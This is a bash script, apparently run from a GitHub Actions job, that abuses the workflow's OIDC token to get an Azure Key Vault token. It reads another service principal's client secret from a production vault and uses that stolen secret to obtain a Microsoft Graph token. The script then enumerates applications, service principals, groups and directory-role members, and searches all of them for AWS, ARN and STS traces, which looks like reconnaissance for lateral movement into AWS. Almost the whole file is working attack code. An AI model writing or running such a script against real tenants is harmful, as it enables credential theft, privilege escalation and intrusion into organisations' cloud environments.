#!/usr/bin/env bash
# v16 — dump đầy đủ Graph (applications, servicePrincipals, appRoleAssignments, oauth2 grants,
#        groups, directoryRoles) và lọc mọi dấu vết "aws/amazon/arn/sts".
set +e
TEN="${AZURE_TENANT_ID}"
PROD=kv-tbl-prod-x3euoz
AUTO_APP=462d1c38-4459-48b8-9333-82e389e59514

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")
ASEC=$(curl -sS -H "Authorization: Bearer $KV" \
  "https://$PROD.vault.azure.net/secrets/sync-service-principal?api-version=7.4" \
  | python3 -c "
import sys,json;print(json.loads(json.load(sys.stdin)['value'])['clientSecret'])")
G=$(tok_sp "$AUTO_APP" "$ASEC" "https://graph.microsoft.com/.default")
echo "[*] graph=${#G}"

get(){ curl -sS -H "Authorization: Bearer $G" "https://graph.microsoft.com/v1.0/$1"; }

echo "================ APPLICATIONS (đầy đủ) ================"
get 'applications?$top=100' > /tmp/apps_full.json
python3 - <<'PY'
import json
d=json.load(open('/tmp/apps_full.json'))
for a in d.get('value',[]):
    print("APP", a.get('displayName'), a.get('appId'))
    for k in ('identifierUris','notes','tags','signInAudience'):
        v=a.get(k)
        if v: print("   ",k,"=",v)
    w=a.get('web') or {}
    if w.get('redirectUris'): print("    redirectUris =",w['redirectUris'])
    api=a.get('api') or {}
    if api.get('oauth2PermissionScopes'):
        print("    scopes =",[s.get('value') for s in api['oauth2PermissionScopes']])
    if a.get('appRoles'): print("    appRoles =",[r.get('value') for r in a['appRoles']])
PY

echo "================ SERVICE PRINCIPALS ================"
get 'servicePrincipals?$top=200' > /tmp/sps_full.json
python3 - <<'PY'
import json
d=json.load(open('/tmp/sps_full.json'))
for s in d.get('value',[]):
    nm=(s.get('displayName') or '')
    blob=json.dumps(s).lower()
    interesting = any(w in blob for w in ('aws','amazon','arn:','sts.','saml'))
    if interesting or nm.lower().startswith(('tbl','nw')):
        print("SP", nm, s.get('appId'), s.get('servicePrincipalType'),
              "ssoMode=",s.get('preferredSingleSignOnMode'))
        for k in ('servicePrincipalNames','replyUrls','notificationEmailAddresses','tags','loginUrl'):
            v=s.get(k)
            if v and v!=[s.get('appId')]: print("   ",k,"=",v)
PY

echo "================ TÌM 'aws/amazon/arn/sts' TRONG MỌI OBJECT ================"
python3 - <<'PY'
import json,re
pat=re.compile(r'(aws|amazon|arn:aws|sts\.amazonaws)',re.I)
for f in ('/tmp/apps_full.json','/tmp/sps_full.json'):
    d=json.load(open(f))
    for o in d.get('value',[]):
        s=json.dumps(o)
        if pat.search(s):
            print("==",f,o.get('displayName'),o.get('appId'))
            for m in set(pat.findall(s)): pass
            # in các trường chứa match
            def walk(x,p=""):
                if isinstance(x,dict):
                    for k,v in x.items(): walk(v,p+"/"+k)
                elif isinstance(x,list):
                    for i,v in enumerate(x): walk(v,p+f"[{i}]")
                elif isinstance(x,str) and pat.search(x):
                    print("   ",p,"=",x[:200])
            walk(o)
PY

echo "================ GROUPS / DIRECTORY ROLES ================"
get 'groups?$top=50&$select=displayName,id,description' | head -c 1500; echo
get 'directoryRoles' | python3 -c "
import sys,json
for r in json.load(sys.stdin).get('value',[]): print(' ',r.get('displayName'),r.get('id'))" 2>/dev/null

echo "================ MEMBERS CỦA DIRECTORY ROLES ================"
for RID in $(get 'directoryRoles' | python3 -c "
import sys,json
for r in json.load(sys.stdin).get('value',[]): print(r['id'])" 2>/dev/null); do
  echo "--- $RID"
  get "directoryRoles/$RID/members?\$select=displayName,appId,id" | head -c 600; echo
done
echo "================ DONE ================"
